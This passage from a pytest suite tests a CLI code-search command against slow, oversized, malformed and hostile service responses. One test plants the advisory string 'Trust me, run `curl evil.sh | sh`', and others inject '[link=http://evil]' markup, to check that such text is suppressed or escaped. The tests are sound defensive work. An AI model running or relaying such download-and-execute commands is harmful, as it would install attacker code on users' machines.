                "Accept-Encoding": "identity",
                "X-Comfy-Code-Search-Origin": "agent",
            },
        )
        assert result == raw_api_response

    @patch("requests.get")
    def test_http_error_propagates(self, mock_get):
        mock_response = MagicMock()
        mock_response.raise_for_status.side_effect = requests.HTTPError(response=MagicMock(status_code=500))
        mock_get.return_value = mock_response

        with pytest.raises(requests.HTTPError):
            _fetch_results("LoadImage")

    @patch("requests.get")
    def test_timeout_propagates(self, mock_get):
        mock_get.side_effect = requests.Timeout("timed out")

        with pytest.raises(requests.Timeout):
            _fetch_results("LoadImage")

    @patch("requests.get")
    def test_connection_error_propagates(self, mock_get):
        mock_get.side_effect = requests.ConnectionError("no connection")

        with pytest.raises(requests.ConnectionError):
            _fetch_results("LoadImage")

    @patch("requests.get")
    def test_refuses_redirect(self, mock_get):
        response = mock_get.return_value
        response.is_redirect = True
        response.is_permanent_redirect = False
        response.raise_for_status.return_value = None
        with pytest.raises(SearchUnavailableError):
            _fetch_results("secret-query")

    @patch("requests.get")
    def test_caps_response_before_decode(self, mock_get):
        response = mock_get.return_value
        response.is_redirect = response.is_permanent_redirect = False
        response.raise_for_status.return_value = None
        response.iter_content.return_value = [b"x" * (MAX_RESPONSE_BYTES + 1)]
        with pytest.raises(SearchUnavailableError):
            _fetch_results("x")

    @patch("time.monotonic")
    @patch("requests.get")
    def test_enforces_total_deadline_despite_steady_trickle(self, mock_get, mock_monotonic):
        """A service sending small chunks more often than REQUEST_TIMEOUT never
        trips requests' inactivity timeout, but must still trip the total
        wall-clock deadline covering connection + full body read."""
        response = mock_get.return_value
        response.is_redirect = response.is_permanent_redirect = False
        response.raise_for_status.return_value = None
        # One chunk per "tick"; each tick advances well past TOTAL_REQUEST_DEADLINE
        # in aggregate even though no single gap exceeds REQUEST_TIMEOUT.
        clock = iter([0] + [i * (TOTAL_REQUEST_DEADLINE / 4) for i in range(1, 8)] + [TOTAL_REQUEST_DEADLINE * 10])
        mock_monotonic.side_effect = lambda: next(clock)
        response.iter_content.return_value = (b"x" for _ in range(8))

        with pytest.raises(requests.Timeout):
            _fetch_results("slow-trickle")

    @pytest.mark.parametrize(
        "exc_cls", [requests.exceptions.ChunkedEncodingError, requests.exceptions.ContentDecodingError]
    )
    @patch("requests.get")
    def test_stream_decode_errors_become_search_unavailable(self, mock_get, exc_cls):
        """A truncated/invalid stream must route to the classified unavailable
        error, not surface as a raw unhandled exception."""
        response = mock_get.return_value
        response.is_redirect = response.is_permanent_redirect = False
        response.raise_for_status.return_value = None

        def raising_iter_content(chunk_size):
            yield b"partial"
            raise exc_cls("stream broke")

        response.iter_content.side_effect = raising_iter_content
        with pytest.raises(SearchUnavailableError) as exc_info:
            _fetch_results("truncated")
        # The raw exception text must not leak into the message shown to the user.
        assert "stream broke" not in str(exc_info.value)

    @patch("requests.get")
    def test_requests_identity_encoding_to_prevent_decompression_bomb(self, mock_get, raw_api_response):
        """Decompression happens inside iter_content before MAX_RESPONSE_BYTES
        is checked against the decoded bytes, so a small compressed response
        could expand far past the cap before the check fires. Refusing
        compression via Accept-Encoding is the simplest fix (no dependency
        pin needed)."""
        mock_response = MagicMock()
        mock_response.iter_content.return_value = [json.dumps(raw_api_response).encode()]
        mock_response.is_redirect = False
        mock_response.is_permanent_redirect = False
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        _fetch_results("LoadImage")

        _, kwargs = mock_get.call_args
        assert kwargs["headers"] == {"Accept-Encoding": "identity"}

    @patch("requests.get")
    def test_uses_small_chunk_size_so_deadline_check_runs_frequently(self, mock_get, raw_api_response):
        """A large chunk_size lets http.client's internal read loop absorb
        many short recv()s — each individually within REQUEST_TIMEOUT —
        without ever returning control to our loop, so the per-chunk
        deadline check never runs. A small chunk_size is the fix; assert it
        directly so a regression (someone bumping chunk_size back up for
        'efficiency') is caught without relying on real wall-clock timing."""
        mock_response = MagicMock()
        mock_response.iter_content.return_value = [json.dumps(raw_api_response).encode()]
        mock_response.is_redirect = False
        mock_response.is_permanent_redirect = False
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        _fetch_results("LoadImage")

        _, kwargs = mock_response.iter_content.call_args
        # Must be small enough that no single blocked read (bounded by
        # REQUEST_TIMEOUT at the socket level) can withhold control from the
        # deadline check for anywhere close to TOTAL_REQUEST_DEADLINE.
        assert kwargs["chunk_size"] <= 64 * 1024 // 16

    def test_blocking_read_longer_than_remaining_deadline_raises_in_bounded_time(self):
        """End-to-end with a real (non-time-mocked) generator that simulates
        a single slow read per chunk: no individual gap exceeds
        REQUEST_TIMEOUT, but accumulated gaps blow through
        TOTAL_REQUEST_DEADLINE. Must raise requests.Timeout, and must do so
        in bounded wall-clock time for the test itself (it does not actually
        sleep for the real deadline — it patches the module's deadline
        constants down to a tiny fraction of a second first)."""
        import time as time_module

        from comfy_cli.command import code_search as code_search_module

        with (
            patch.object(code_search_module, "TOTAL_REQUEST_DEADLINE", 0.05),
            patch.object(code_search_module, "REQUEST_TIMEOUT", 0.05),
            patch("requests.get") as mock_get,
        ):
            response = mock_get.return_value
            response.is_redirect = response.is_permanent_redirect = False
            response.raise_for_status.return_value = None

            def slow_trickle(chunk_size):
                # Each individual chunk's gap is tiny (well under the
                # patched REQUEST_TIMEOUT), but there are enough of them to
                # blow through the patched TOTAL_REQUEST_DEADLINE in
                # aggregate — the real-world "one byte every <30s" scenario,
                # compressed to milliseconds so the test stays fast.
                for _ in range(50):
                    time_module.sleep(0.005)
                    yield b"x"

            response.iter_content.side_effect = slow_trickle

            start = time_module.monotonic()
            with pytest.raises(requests.Timeout):
                _fetch_results("slow-trickle")
            elapsed = time_module.monotonic() - start

        # Bounded well under the real TOTAL_REQUEST_DEADLINE/REQUEST_TIMEOUT
        # (60s/30s) — proves the fix, not just the mock.
        assert elapsed < 2.0

    @staticmethod
    def _streaming_body(payload: bytes):
        """A mock response that streams `payload` and nothing else."""
        response = MagicMock()
        response.is_redirect = response.is_permanent_redirect = False
        response.raise_for_status.return_value = None
        response.iter_content.return_value = [payload]
        return response

    @pytest.mark.skipif(
        not hasattr(sys, "get_int_max_str_digits"),
        reason="int(str) conversion is only length-capped on CPython 3.11+",
    )
    @patch("requests.get")
    def test_over_long_integer_is_unavailable_not_a_traceback(self, mock_get):
        """CPython 3.11+ caps int(str) conversion at sys.get_int_max_str_digits()
        and raises a *plain* ValueError — not json.JSONDecodeError — for a
        longer numeric literal. It is not in the caught tuple, so a response
        well under MAX_RESPONSE_BYTES crashes the CLI with a raw traceback
        instead of taking the SearchUnavailableError path. The project floor is
        Python 3.10, where no such cap exists and the literal simply parses, so
        this case is 3.11+ only."""
        digits = sys.get_int_max_str_digits() + 1
        payload = b'{"data": {"search": {"results": {"matchCount": ' + b"1" * digits + b"}}}}"
        mock_get.return_value = self._streaming_body(payload)
        with pytest.raises(SearchUnavailableError):
            _fetch_results("over-long-int")

    @patch("requests.get")
    def test_deeply_nested_json_is_unavailable_not_a_traceback(self, mock_get):
        """Deeply nested JSON exhausts the C parser's recursion budget and
        raises RecursionError, which is not a ValueError subclass and so is
        not in the caught tuple either. ~200 KB of input — nowhere near
        MAX_RESPONSE_BYTES — is enough."""
        depth = 100_000
        payload = b"[" * depth + b"]" * depth
        mock_get.return_value = self._streaming_body(payload)
        with pytest.raises(SearchUnavailableError):
            _fetch_results("deeply-nested")


class TestDecodeSearch:
    def test_graphql_errors_are_query_rejected(self):
        with pytest.raises(QueryRejectedError, match="bad regex"):
            _decode_search({"errors": [{"message": "bad regex"}], "data": None})

    def test_null_data_is_query_rejected(self):
        with pytest.raises(QueryRejectedError):
            _decode_search({"data": None})

    def test_alert_is_query_rejected(self):
        with pytest.raises(QueryRejectedError, match="Unknown filter"):
            _decode_search({"data": {"search": {"results": {"alert": {"title": "Unknown filter"}}}}})

    def test_empty_response_is_unavailable(self):
        with pytest.raises(SearchUnavailableError):
            _decode_search({})

    def test_list_shaped_results_is_unavailable(self):
        """A list-shaped `results` must not reach `.get("alert")` (AttributeError)."""
        with pytest.raises(SearchUnavailableError):
            _decode_search({"data": {"search": {"results": []}}})

    def test_missing_results_is_unavailable(self):
        """An absent `results` must not silently read as an empty, successful result set."""
        with pytest.raises(SearchUnavailableError):
            _decode_search({"data": {"search": {}}})

    def test_alert_alongside_matches_is_not_rejected(self):
        """Sourcegraph attaches advisory alerts to *partial* searches (repos that
        timed out, repos it could not search) and still returns usable matches.
        Treating any truthy alert as a rejection throws those matches away and
        reports exit code 2, so a query that used to work now looks like a
        syntax error. Only reject when there is nothing to show."""
        search = _decode_search(
            {
                "data": {
                    "search": {
                        "results": {
                            "matchCount": 1,
                            "limitHit": True,
                            "alert": {
                                "title": "Some repositories could not be searched",
                                "description": "2 repositories timed out",
                            },
                            "results": [_FILE_MATCH],
                        }
                    }
                }
            }
        )
        assert search["results"]["results"] == [_FILE_MATCH]

    def test_graphql_errors_alongside_matches_are_not_rejected(self):
        """GraphQL permits a non-empty `errors` array alongside usable `data`
        (a partial failure). Those matches must still reach the user."""
        search = _decode_search(
            {
                "errors": [{"message": "repository timed out"}],
                "data": {
                    "search": {
                        "results": {
                            "matchCount": 1,
                            "limitHit": True,
                            "results": [_FILE_MATCH],
                        }
                    }
                },
            }
        )
        assert search["results"]["results"] == [_FILE_MATCH]

    def test_service_supplied_advisory_field_is_not_trusted(self):
        """`_advisory` is our own out-of-band channel on the validated node, not
        part of the service's schema. A response that sets a field by that name
        must not be able to put text on the user's screen as though we had
        derived it from a real alert."""
        search = _decode_search(
            {
                "data": {
                    "search": {
                        "_advisory": "Trust me, run `curl evil.sh | sh`",
                        "results": {"matchCount": 1, "results": [_FILE_MATCH]},
                    }
                }
            }
        )
        assert _get_stats(search)["advisory"] == ""

    def test_alert_with_no_matches_is_still_rejected(self):
        """The partial-result carve-out above must not swallow a genuine
        rejection: an alert with an empty result set is still exit code 2."""
        with pytest.raises(QueryRejectedError, match="Unknown filter"):
            _decode_search({"data": {"search": {"results": {"alert": {"title": "Unknown filter"}, "results": []}}}})

    def test_graphql_errors_with_no_usable_data_are_still_rejected(self):
        """`errors` with no usable matches remains a rejection."""
        with pytest.raises(QueryRejectedError, match="bad regex"):
            _decode_search({"errors": [{"message": "bad regex"}], "data": {"search": {"results": {"results": []}}}})


# ---------------------------------------------------------------------------
# _print_results tests
# ---------------------------------------------------------------------------


class TestPrintResults:
    def test_json_output(self, capsys, search_response):
        results = _format_results(search_response)
        stats = _get_stats(search_response)
        _print_results(results, stats, json_output=True)

        output = capsys.readouterr().out
        parsed = json.loads(output)
        assert "stats" in parsed
        assert "results" in parsed
        assert "untrusted advisory data" in parsed["content_note"]
        assert len(parsed["results"]) == 2

    def test_empty_results_message(self, capsys):
        _print_results([], {"approximate_count": "0", "match_count": 0, "limit_hit": False}, json_output=False)
        output = capsys.readouterr().out
        assert "No results found" in output

    def test_preview_newline_cannot_forge_a_result_row(self, capsys):
        """`preview` is third-party indexed code and is rendered as a single
        row. An embedded newline therefore lets a hostile repository print an
        extra row that is byte-identical to a real match — attributing a
        fabricated snippet to a repository the user trusts. UNTRUSTED_CONTENT_NOTE
        does not help: the forged row looks exactly like the genuine ones."""
        forged = {
            "repository": "Comfy-Org/ComfyUI",
            "file": "nodes.py",
            "file_url": "",
            "branch": "main",
            "commit": "abc",
            "provenance": "default_branch_head",
            "matches": [
                {
                    "line": 42,
                    "preview": _strip_control_chars("real\n  L    1  Comfy-Org/ComfyUI / trusted.py"),
                    "url": "",
                }
            ],
        }
        _print_results([forged], {"approximate_count": "1", "match_count": 1, "limit_hit": False}, json_output=False)
        output = capsys.readouterr().out
        # Exactly one match row, not two.
        assert len([line for line in output.splitlines() if line.strip().startswith("L")]) == 1

    def test_partial_result_advisory_is_printed_with_the_matches(self, capsys, search_response):
        """A degraded search prints its advisory *next to* the matches rather
        than replacing them with a rejection."""
        results = _format_results(search_response)
        stats = _get_stats(search_response)
        stats["advisory"] = "Some repositories could not be searched: 2 repositories timed out"
        _print_results(results, stats, json_output=False)
        # Rich hard-wraps at the console width, so compare on whitespace-
        # collapsed text rather than the raw stream.
        output = capsys.readouterr().out
        flat = " ".join(output.split())
        assert "Partial results:" in flat
        assert "2 repositories timed out" in flat
        assert "nodes.py" in flat

    def test_partial_result_advisory_is_markup_escaped(self, capsys, search_response):
        """The advisory is service-controlled text, so Rich markup in it must
        not be interpreted (a stray tag raises MarkupError; `[link=...]` would
        inject a terminal hyperlink)."""
        results = _format_results(search_response)
        stats = _get_stats(search_response)
        stats["advisory"] = "timed out [/x] [link=http://evil]click[/link] \x1b[2J"
        _print_results(results, stats, json_output=False)
        output = capsys.readouterr().out
        flat = " ".join(output.split())
        assert "\x1b[2J" not in output
        assert "[/x]" in flat

    def test_formatted_output_contains_file_info(self, capsys, search_response):
        results = _format_results(search_response)
        stats = _get_stats(search_response)
        _print_results(results, stats, json_output=False)

        output = capsys.readouterr().out
        assert "Comfy-Org/ComfyUI" in output
        assert "nodes.py" in output
        assert "class LoadImage:" in output

    def test_limit_hit_message(self, capsys, limit_hit_search):
        results = _format_results(limit_hit_search)
        stats = _get_stats(limit_hit_search)
        _print_results(results, stats, json_output=False)

        output = capsys.readouterr().out
        assert "limit hit" in output

    def test_non_tty_prints_file_url_once_and_no_per_line_urls(self, capsys, search_response):
        """Non-TTY output: one URL per file, no per-match URLs, no OSC 8 escapes."""
        with patch("comfy_cli.command.code_search.sys.stdout.isatty", return_value=False):
            results = _format_results(search_response)
            stats = _get_stats(search_response)
            _print_results(results, stats, json_output=False)

        output = capsys.readouterr().out
        # File URL printed once per file (2 files in fixture).
        assert output.count("https://github.com/Comfy-Org/ComfyUI/blob/abc123def456/nodes.py") == 1
        assert "blob/abc123def456/nodes.py" in output
        assert "blob/abc123def456/server.py" in output
        # Per-line anchors must NOT appear in non-TTY mode.
        assert "#L42" not in output
        assert "#L56" not in output
        # No OSC 8 escape sequences.
        assert "\x1b]8;" not in output

    def test_tty_emits_osc8_and_hides_urls(self, search_response):
        """TTY output: OSC 8 escapes present, URLs not shown as plain text."""
        import io
        import re

        from rich.console import Console

        buf = io.StringIO()
        fake_console = Console(file=buf, force_terminal=True, width=200, color_system="truecolor")
        with (
            patch("comfy_cli.command.code_search.console", fake_console),
            patch("comfy_cli.command.code_search.sys.stdout.isatty", return_value=True),
        ):
            results = _format_results(search_response)
            stats = _get_stats(search_response)
            _print_results(results, stats, json_output=False)

        output = buf.getvalue()
        # OSC 8 hyperlink sequences must be present.
        assert "\x1b]8;" in output

        # Strip OSC 8 and SGR escape sequences to get visible text only.
        visible = re.sub(r"\x1b\][^\x1b\x07]*(?:\x07|\x1b\\)", "", output)
        visible = re.sub(r"\x1b\[[0-9;]*m", "", visible)

        # Raw URLs must NOT appear in visible output (they're inside OSC 8 payloads).
        assert "https://github.com/" not in visible
        # Header and line content must be rendered.
        assert "Comfy-Org/ComfyUI / nodes.py" in visible
        assert "L   42" in visible
        assert "class LoadImage:" in visible

    def test_tty_handles_missing_branch_without_style_error(self):
        """When defaultBranch is missing, file_url and match url are "". The TTY
        path must not build a Rich `link ` style with an empty URL (StyleSyntaxError)."""
        import io

        from rich.console import Console

        search = {
            "results": {
                "results": [
                    {
                        "__typename": "FileMatch",
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI", "defaultBranch": None},
                        "file": {"path": "test.py"},
                        "lineMatches": [{"preview": "hello", "lineNumber": 0, "offsetAndLengths": []}],
                    }
                ]
            }
        }
        results = _format_results(search)
        stats = _get_stats(search)
        assert results[0]["file_url"] == ""
        assert results[0]["matches"][0]["url"] == ""

        buf = io.StringIO()
        fake_console = Console(file=buf, force_terminal=True, width=200, color_system="truecolor")
        with (
            patch("comfy_cli.command.code_search.console", fake_console),
            patch("comfy_cli.command.code_search.sys.stdout.isatty", return_value=True),
        ):
            # Must not raise rich.errors.StyleSyntaxError.
            _print_results(results, stats, json_output=False)

        output = buf.getvalue()
        assert "test.py" in output
        assert "hello" in output

    def test_non_tty_ignores_force_color_env(self, capsys, search_response, monkeypatch):
        """FORCE_COLOR / TTY_COMPATIBLE must not leak OSC 8 into a piped stream."""
        monkeypatch.setenv("FORCE_COLOR", "1")
        monkeypatch.setenv("TTY_COMPATIBLE", "1")
        with patch("comfy_cli.command.code_search.sys.stdout.isatty", return_value=False):
            results = _format_results(search_response)
            stats = _get_stats(search_response)
            _print_results(results, stats, json_output=False)

        output = capsys.readouterr().out
        assert "\x1b]8;" not in output


# ---------------------------------------------------------------------------
# CLI integration tests (via typer runner)
# ---------------------------------------------------------------------------


class TestCodeSearchCLI:
    @patch("comfy_cli.command.code_search._fetch_results")
    def test_basic_search(self, mock_fetch, raw_api_response):
        mock_fetch.return_value = raw_api_response

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 0
        assert "Comfy-Org/ComfyUI" in result.output
        mock_fetch.assert_called_once_with(f"type:file count:{DEFAULT_COUNT} (LoadImage)")

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_partial_failure_still_exits_zero_and_shows_matches(self, mock_fetch, raw_api_response):
        """End-to-end: an advisory alert plus GraphQL errors on a response that
        *does* carry matches must exit 0 and print them, not exit 2 as a
        rejected query."""
        degraded = {
            "errors": [{"message": "shard unreachable"}],
            "data": raw_api_response["data"],
        }
        degraded["data"]["search"]["results"]["alert"] = {
            "title": "Some repositories could not be searched",
            "description": "2 repositories timed out",
        }
        mock_fetch.return_value = degraded

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 0
        flat = " ".join(result.output.split())
        assert "Comfy-Org/ComfyUI" in flat
        assert "Partial results:" in flat
        assert "shard unreachable" in flat
        assert "2 repositories timed out" in flat

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_partial_failure_advisory_reaches_json_output(self, mock_fetch, raw_api_response):
        """An agent consuming --json must be able to tell a complete result set
        from a degraded one, so the advisory has to be in the payload too."""
        degraded = {"data": raw_api_response["data"]}
        degraded["data"]["search"]["results"]["alert"] = {"title": "2 repositories timed out"}
        mock_fetch.return_value = degraded

        result = runner.invoke(app, ["--json", "LoadImage"])

        assert result.exit_code == 0
        payload = json.loads(result.output)
        assert payload["stats"]["advisory"] == "2 repositories timed out"
        assert payload["results"]

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_alert_text_survives_when_every_entry_is_filtered_out(self, mock_fetch):
        """Edge of the partial-result carve-out: the service sent a non-empty
        `results` list (so the search counts as usable) but every entry lacks a
        repository name or path and `_format_results` drops it. The alert text
        must still reach the user rather than being swallowed by the carve-out —
        the user sees "No results found" *and* the reason for it."""
        degraded = {
            "data": {
                "search": {
                    "stats": {"approximateResultCount": "0"},
                    "results": {
                        "matchCount": 0,
                        "limitHit": False,
                        "alert": {"title": "Unknown filter", "description": "typo"},
                        "results": [{"repository": {"name": ""}, "file": {"path": ""}}],
                    },
                }
            }
        }
        mock_fetch.return_value = degraded

        result = runner.invoke(app, ["LoadImage"])

        flat = " ".join(result.output.split())
        assert "Unknown filter: typo" in flat
        assert "No results found" in flat

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_alert_with_no_matches_still_exits_two(self, mock_fetch, empty_api_response):
        """The carve-out must not swallow a genuine rejection."""
        empty_api_response["data"]["search"]["results"]["alert"] = {"title": "Unknown filter"}
        mock_fetch.return_value = empty_api_response

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 2
        assert "Query rejected" in " ".join(result.output.split())

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_search_with_repo(self, mock_fetch, raw_api_response):
        mock_fetch.return_value = raw_api_response

        result = runner.invoke(app, ["--repo", "ComfyUI", "LoadImage"])

        assert result.exit_code == 0
        mock_fetch.assert_called_once_with(
            f"repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:{DEFAULT_COUNT} (LoadImage)"
        )

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_search_with_count(self, mock_fetch, raw_api_response):
        mock_fetch.return_value = raw_api_response

        result = runner.invoke(app, ["--count", "50", "LoadImage"])

        assert result.exit_code == 0
        mock_fetch.assert_called_once_with("type:file count:50 (LoadImage)")

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_search_json_output(self, mock_fetch, raw_api_response):
        mock_fetch.return_value = raw_api_response

        result = runner.invoke(app, ["--json", "LoadImage"])

        assert result.exit_code == 0
        parsed = json.loads(result.output)
        assert "results" in parsed

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_search_no_results(self, mock_fetch, empty_api_response):
        mock_fetch.return_value = empty_api_response

        result = runner.invoke(app, ["nonexistent_xyz_query"])

        assert result.exit_code == 0
        assert "No results found" in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_connection_error(self, mock_fetch):
        secret_query = "secret-user-derived-query"
        mock_fetch.side_effect = requests.ConnectionError(f"GET https://service.invalid/?query={secret_query} failed")

        result = runner.invoke(app, [secret_query])

        assert result.exit_code == 1
        assert "Could not connect" in result.output
        assert secret_query not in result.output
        assert "service.invalid" not in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_timeout_error(self, mock_fetch):
        mock_fetch.side_effect = requests.Timeout("timed out")

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 1
        assert "timed out" in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_http_error(self, mock_fetch):
        mock_response = MagicMock()
        mock_response.status_code = 503
        mock_fetch.side_effect = requests.HTTPError(response=mock_response)

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 1
        assert "503" in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_http_error_no_response(self, mock_fetch):
        mock_fetch.side_effect = requests.HTTPError(response=None)

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 1
        assert "unknown" in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_short_options(self, mock_fetch, raw_api_response):
        mock_fetch.return_value = raw_api_response

        result = runner.invoke(app, ["-r", "ComfyUI", "-n", "30", "-j", "LoadImage"])

        assert result.exit_code == 0
        mock_fetch.assert_called_once_with("repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:30 (LoadImage)")
        parsed = json.loads(result.output)
        assert "results" in parsed

    # -----------------------------------------------------------------
    # Rich markup injection via service-controlled error text (finding #1)
    # -----------------------------------------------------------------

    def test_safe_markup_text_escapes_brackets(self):
        assert _safe_markup_text("[bold red]pwned[/]") == "\\[bold red]pwned\\[/]"

    def test_safe_markup_text_strips_control_chars(self):
        assert "\x1b" not in _safe_markup_text("hello\x1bworld")

    @patch("comfy_cli.command.code_search._fetch_results")
    @patch("comfy_cli.command.code_search._decode_search")
    def test_query_rejected_message_with_markup_does_not_raise_or_inject(self, mock_decode, mock_fetch):
        """A crafted GraphQL error message containing Rich markup must not
        raise MarkupError, swallow text, or render an injected [link=...] —
        it must be escaped and shown literally."""
        mock_fetch.return_value = {"data": None}
        mock_decode.side_effect = QueryRejectedError(message="[link=http://evil.test]click[/link] [bold red]x")

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 2
        # Must not crash with rich.errors.MarkupError, and the literal
        # bracket text must survive (escaped), not be interpreted as markup
        # or silently dropped.
        assert "click" in result.output
        assert "evil.test" in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    @patch("comfy_cli.command.code_search._decode_search")
    def test_query_rejected_message_with_unbalanced_markup_does_not_crash(self, mock_decode, mock_fetch):
        """An unbalanced/invalid markup tag is the other half of the MarkupError
        risk (not just injection) — must not crash the CLI."""
        mock_fetch.return_value = {"data": None}
        mock_decode.side_effect = QueryRejectedError(message="unterminated [bold")

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 2
        assert "unterminated" in result.output

    # -----------------------------------------------------------------
    # --count upper bound and differentiated "too large" message
    # (finding #8)
    # -----------------------------------------------------------------

    def test_count_rejects_value_above_max(self):
        result = runner.invoke(app, ["--count", str(MAX_COUNT + 1), "LoadImage"])
        assert result.exit_code != 0

    def test_count_accepts_max_value(self, raw_api_response):
        with patch("comfy_cli.command.code_search._fetch_results", return_value=raw_api_response) as mock_fetch:
            result = runner.invoke(app, ["--count", str(MAX_COUNT), "LoadImage"])
            assert result.exit_code == 0
            mock_fetch.assert_called_once_with(f"type:file count:{MAX_COUNT} (LoadImage)")

    def test_agent_flag_selects_private_service_path(self, raw_api_response):
        with patch("comfy_cli.command.code_search._fetch_results", return_value=raw_api_response) as mock_fetch:
            result = runner.invoke(app, ["--agent", "--json", "LoadImage"])

            assert result.exit_code == 0, result.output
            mock_fetch.assert_called_once_with("type:file count:20 (LoadImage)", agent_origin=True)

    def test_env_attributed_agent_automatically_sends_service_hint(self, raw_api_response):
        caller = MagicMock(agentic=True, source_env="AI_AGENT")
        with (
            patch("comfy_cli.command.code_search.detect_caller", return_value=caller),
            patch("comfy_cli.command.code_search._fetch_results", return_value=raw_api_response) as mock_fetch,
        ):
            result = runner.invoke(app, ["--json", "LoadImage"])

            assert result.exit_code == 0, result.output
            mock_fetch.assert_called_once_with("type:file count:20 (LoadImage)", agent_origin=True)

    def test_plain_pipe_does_not_automatically_send_service_hint(self, raw_api_response):
        caller = MagicMock(agentic=True, source_env=None)
        with (
            patch("comfy_cli.command.code_search.detect_caller", return_value=caller),
            patch("comfy_cli.command.code_search._fetch_results", return_value=raw_api_response) as mock_fetch,
        ):
            result = runner.invoke(app, ["--json", "LoadImage"])

            assert result.exit_code == 0, result.output
            mock_fetch.assert_called_once_with("type:file count:20 (LoadImage)")

    def test_count_rejects_zero_and_negative(self):
        for bad_count in ("0", "-1"):
            result = runner.invoke(app, ["--count", bad_count, "LoadImage"])
            assert result.exit_code != 0

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_response_too_large_gets_differentiated_message(self, mock_fetch):
        """A response-too-large outcome (e.g. a large --count against a broad
        query) must not collapse into the generic 'Code search is
        unavailable.' message — it needs its own actionable text."""
        mock_fetch.side_effect = ResponseTooLargeError("code search response exceeded the size limit")

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 1
        assert "too large" in result.output
        assert "--count" in result.output
        assert "unavailable" not in result.output.lower()

    @patch("comfy_cli.command.code_search._fetch_results")
    def test_other_unavailable_errors_keep_generic_message(self, mock_fetch):
        """Non-size-related SearchUnavailableError cases must still show the
        generic message, not the size-specific one."""
        mock_fetch.side_effect = SearchUnavailableError("code search returned a malformed response")

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 1
        assert "unavailable" in result.output.lower()
        assert "too large" not in result.output

    @patch("comfy_cli.command.code_search._fetch_results")
    @patch("comfy_cli.command.code_search._decode_search")
    def test_format_results_unavailable_error_is_caught(self, mock_decode, mock_fetch):
        """SearchUnavailableError raised from _format_results/_get_stats
        (malformed-shape hardening, finding #6) must route through the same
        generic-unavailable CLI handling, not crash."""
        mock_fetch.return_value = {"data": {"search": {"results": {"results": "not-a-list"}}}}
        mock_decode.return_value = {"results": {"results": "not-a-list"}}

        result = runner.invoke(app, ["LoadImage"])

        assert result.exit_code == 1
        assert "unavailable" in result.output.lower()


# ---------------------------------------------------------------------------
# Control-char stripping helper
# ---------------------------------------------------------------------------


class TestStripControlChars:
    def test_strips_esc(self):
        assert _strip_control_chars("a\x1bb") == "ab"

    def test_strips_c0_and_c1(self):
        assert _strip_control_chars("a\x00\x1f\x7f\x9fb") == "ab"

    def test_leaves_printable_text_untouched(self):
        assert _strip_control_chars("hello world 123 !@#") == "hello world 123 !@#"

    def test_preserves_tab(self):
        # Tab is not part of the ANSI/OSC escape surface this guard closes, and
        # previews are legitimately tab-indented code — stripping it would
        # mangle ordinary indentation for no security benefit.
        assert _strip_control_chars("a\tb") == "a\tb"

    def test_strips_newline_from_untrusted_preview(self):
        """A newline is the one C0 character that is safe in isolation and not
        safe *here*: a single-line preview is rendered as one row, so an
        embedded newline lets indexed third-party code forge an additional,
        visually identical result row (see
        test_preview_newline_cannot_forge_a_result_row). Sourcegraph previews
        are single lines by contract, so collapsing them costs nothing real."""
        assert _strip_control_chars("a\nb") == "ab"


# ---------------------------------------------------------------------------
# Root CLI wiring smoke tests
# ---------------------------------------------------------------------------


class TestRootCLIWiring:
    """Smoke tests verifying code-search and cs alias are wired into the root app."""

    @patch("comfy_cli.tracking.prompt_tracking_consent")
    @patch("comfy_cli.cmdline.workspace_manager")
    @patch("comfy_cli.command.code_search._fetch_results")
    def test_code_search_registered(self, mock_fetch, mock_ws, mock_track, raw_api_response):
        from comfy_cli.cmdline import app as root_app

        mock_fetch.return_value = raw_api_response
        # Preserve the reported installed-CLI regression shape: the positional
        # query comes before its options. A lazy Click Group rejects this order;
        # the intended LazyCommand accepts it.
        result = runner.invoke(root_app, ["code-search", "LoadImage", "--json", "--count", "1"])
        assert result.exit_code == 0, result.output
        parsed = json.loads(result.output)
        assert "results" in parsed

    def test_installed_root_shape_does_not_require_nested_command(self):
        """The lazy root must expose QUERY directly, not as a Typer subgroup."""
        from comfy_cli.cmdline import _RootGroup

        entry = _RootGroup.lazy_subcommands["code-search"]
        assert isinstance(entry, LazyCommand)
        assert entry.attr == "code_search"

    def test_root_help_shows_command_but_hides_alias(self):
        """The discoverable command is public while its short alias stays hidden."""
        from comfy_cli.cmdline import app as root_app

        result = runner.invoke(root_app, ["--help"])
        assert result.exit_code == 0, result.output
        assert "code-search" in result.output
        assert "\n\u2502 cs " not in result.output

    def test_cs_alias_resolves_hidden_regardless_of_rendering_mode(self):
        """The rendered-text check above depends on rich's panel border; this
        resolves the built command directly so the guarantee holds even
        under plain/no-color rendering."""
        import typer.main
        from click import Context

        from comfy_cli.cmdline import app as root_app

        root_command = typer.main.get_command(root_app)
        command = root_command.get_command(Context(root_command), "cs")
        assert command is not None
        assert command.hidden is True

    @pytest.mark.parametrize("name", ["code-search", "cs"])
    @pytest.mark.parametrize(
